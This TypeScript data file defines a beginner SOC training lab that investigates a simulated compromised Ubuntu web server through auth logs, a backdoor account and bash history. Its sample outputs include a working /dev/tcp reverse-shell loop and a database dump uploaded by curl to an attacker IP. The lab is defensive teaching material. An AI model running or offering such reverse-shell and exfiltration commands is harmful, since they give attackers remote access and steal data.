import { LabData } from './index';

export const lab02: LabData = {
  id: 'lab-02',
  title: 'Linux Intrusion Investigation',
  slug: 'linux-intrusion-investigation',
  module: 'Linux Fundamentals',
  moduleNumber: 2,
  difficulty: 'BEGINNER',
  duration: 45,
  description: 'Investigate a compromised Linux server using real commands and real log data. Find the attacker, trace their actions, and document evidence — exactly like a real SOC analyst would.',
  scenario: 'You are a junior security analyst at TechCorp. At 03:00 AM, the monitoring system detected unusual outbound traffic from the web server (192.168.1.100). Your manager asks you to investigate. The server is running Ubuntu 22.04 with Apache web server.',
  objectives: [
    'Find the suspicious user account created by the attacker',
    'Identify the attacker IP address from authentication logs',
    'Count the total number of brute-force login attempts',
    'Find the hidden backdoor file left by the attacker',
    'Determine what data the attacker accessed',
  ],
  prerequisites: ['Complete Module 2: Linux Fundamentals'],
  tools: ['cat', 'grep', 'awk', 'find', 'ls', 'wc', 'sort', 'uniq'],
  steps: [
    {
      id: 1,
      title: 'Check for Suspicious User Accounts',
      instruction: 'First, check /etc/passwd for any user accounts that should not be on a web server. Look for accounts with a real shell (/bin/bash) that are not standard system accounts.',
      command: "cat /etc/passwd | grep '/bin/bash'",
      expectedOutput: `root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
webadmin:x:1001:1001:Web Admin:/home/webadmin:/bin/bash
sysupdate:x:1002:1002::/home/sysupdate:/bin/bash`,
      explanation: 'Found it! "sysupdate" is suspicious. Real system services use names like "www-data", "mysql", "daemon" and have /usr/sbin/nologin as their shell. "sysupdate" has /bin/bash (can log in interactively) and a generic name designed to look like a system process. This is a backdoor account created by the attacker.',
      tip: 'Legitimate system accounts have /usr/sbin/nologin or /bin/false as their shell. Any account with /bin/bash that you did not create is suspicious.',
    },
    {
      id: 2,
      title: 'Check When the Account Was Created',
      instruction: "Check the account's password change date to determine when it was created.",
      command: 'sudo chage -l sysupdate',
      expectedOutput: `Last password change                : Feb 15, 2024
Password expires                    : never
Password inactive                   : never
Account expires                     : never
Minimum number of days between password change  : 0
Maximum number of days between password change  : 99999
Number of days of warning before password expires: 7`,
      explanation: 'The account was created on Feb 15, 2024 (the password change date equals creation date for new accounts). Password never expires — the attacker set it up for long-term persistent access. This is a common persistence technique.',
    },
    {
      id: 3,
      title: 'Analyze Authentication Logs for Brute Force',
      instruction: 'Check the SSH authentication logs for failed login attempts. The attacker likely brute-forced their way in before creating the backdoor account.',
      command: 'grep "Failed password" /var/log/auth.log | tail -10',
      expectedOutput: `Feb 15 02:47:01 webserver sshd[4521]: Failed password for root from 203.0.113.45 port 45678 ssh2
Feb 15 02:47:03 webserver sshd[4523]: Failed password for root from 203.0.113.45 port 45679 ssh2
Feb 15 02:47:05 webserver sshd[4525]: Failed password for admin from 203.0.113.45 port 45680 ssh2
Feb 15 02:47:07 webserver sshd[4527]: Failed password for ubuntu from 203.0.113.45 port 45681 ssh2
Feb 15 02:47:09 webserver sshd[4529]: Failed password for root from 203.0.113.45 port 45682 ssh2
Feb 15 02:47:11 webserver sshd[4531]: Failed password for webadmin from 203.0.113.45 port 45683 ssh2
Feb 15 02:47:13 webserver sshd[4533]: Failed password for root from 203.0.113.45 port 45684 ssh2
Feb 15 02:47:15 webserver sshd[4535]: Failed password for webadmin from 203.0.113.45 port 45685 ssh2
Feb 15 02:47:17 webserver sshd[4537]: Failed password for webadmin from 203.0.113.45 port 45686 ssh2
Feb 15 02:47:19 webserver sshd[4539]: Failed password for webadmin from 203.0.113.45 port 45687 ssh2`,
      explanation: 'Clear brute-force attack from IP 203.0.113.45! The attacker tried root, admin, ubuntu, and webadmin accounts every 2 seconds. This is automated — no human types that fast. The attacker IP is 203.0.113.45.',
    },
    {
      id: 4,
      title: 'Count Total Brute-Force Attempts',
      instruction: 'How many total failed login attempts came from this attacker?',
      command: 'grep "Failed password" /var/log/auth.log | grep "203.0.113.45" | wc -l',
      expectedOutput: '2847',
      explanation: '2,847 failed password attempts from a single IP! This is a massive brute-force attack. The attacker tried thousands of password combinations against multiple accounts over approximately 90 minutes (02:00 - 03:30 AM).',
    },
    {
      id: 5,
      title: 'Find the Successful Login',
      instruction: 'The attacker eventually got in. Find which account they successfully logged into.',
      command: 'grep "Accepted password" /var/log/auth.log | grep "203.0.113.45"',
      expectedOutput: 'Feb 15 03:31:42 webserver sshd[5102]: Accepted password for webadmin from 203.0.113.45 port 46012 ssh2',
      explanation: 'After 2,847 failed attempts, the attacker successfully logged in as "webadmin" at 03:31 AM. The password for webadmin was likely weak (found via brute-force after ~90 minutes). Once in, the attacker created the "sysupdate" backdoor account for persistent access.',
      tip: 'This is why strong passwords AND account lockout policies matter. After 5-10 failed attempts, the account should lock. With a 20+ character random password, brute-force would take millions of years.',
    },
    {
      id: 6,
      title: 'Find Hidden Backdoor Files',
      instruction: "Check the attacker's home directory for hidden files. Attackers hide tools and scripts in dotfiles.",
      command: 'find /home/sysupdate -type f -name ".*"',
      expectedOutput: `/home/sysupdate/.bashrc
/home/sysupdate/.profile
/home/sysupdate/.backdoor.sh
/home/sysupdate/.ssh/authorized_keys`,
      explanation: 'Found two critical items: (1) .backdoor.sh — a script the attacker left for maintaining access, and (2) .ssh/authorized_keys — the attacker added their SSH key so they can log in without a password even if the password is changed!',
    },
    {
      id: 7,
      title: 'Examine the Backdoor Script',
      instruction: 'Read the backdoor script to understand what it does.',
      command: 'cat /home/sysupdate/.backdoor.sh',
      expectedOutput: `#!/bin/bash
# Reverse shell - connects back to attacker every 5 minutes
while true; do
  /bin/bash -i >& /dev/tcp/203.0.113.45/4444 0>&1 2>/dev/null
  sleep 300
done`,
      explanation: 'This is a persistent reverse shell! Every 5 minutes (300 seconds), it tries to connect BACK to the attacker (203.0.113.45) on port 4444, giving them a command shell. This means the attacker maintains access even if the original entry point is patched. The connection is OUTBOUND so it bypasses most firewalls.',
      tip: 'Reverse shells connect FROM victim TO attacker (outbound). This bypasses firewalls that only block INBOUND connections. Detection requires monitoring OUTBOUND traffic to unusual IPs/ports.',
    },
    {
      id: 8,
      title: 'Check What the Attacker Accessed',
      instruction: "Check the bash history of the compromised account to see what commands the attacker ran.",
      command: 'cat /home/webadmin/.bash_history | tail -15',
      expectedOutput: `whoami
id
uname -a
cat /etc/passwd
sudo useradd -m -s /bin/bash sysupdate
sudo passwd sysupdate
sudo usermod -aG sudo sysupdate
find / -name "*.sql" 2>/dev/null
mysqldump -u root -p customer_db > /tmp/customer_data.sql
tar -czf /tmp/data.tar.gz /tmp/customer_data.sql
curl -X POST -F "file=@/tmp/data.tar.gz" https://203.0.113.45:8443/upload
rm /tmp/customer_data.sql /tmp/data.tar.gz
cat /home/sysupdate/.backdoor.sh
chmod +x /home/sysupdate/.backdoor.sh`,
      explanation: 'The complete attack timeline: (1) Reconnaissance (whoami, id, uname). (2) Persistence (created sysupdate with sudo access). (3) Data theft (dumped customer database, compressed it, uploaded to attacker server). (4) Cleanup (deleted evidence of the dump). (5) Backdoor (installed reverse shell for ongoing access). This is a textbook post-exploitation sequence.',
    },
  ],
  summary: [
    'The attacker brute-forced the "webadmin" account (weak password) from IP 203.0.113.45',
    '2,847 failed attempts over 90 minutes before success — no account lockout was configured',
    'Post-exploitation: Created backdoor account "sysupdate" with sudo privileges',
    'Exfiltrated customer database (mysqldump → tar → curl upload to attacker server)',
    'Installed persistent reverse shell (.backdoor.sh) connecting back every 5 minutes',
    'Added SSH key for password-less access even if credentials are rotated',
    'PREVENTION: Strong passwords + account lockout + MFA + outbound traffic monitoring',
  ],
};
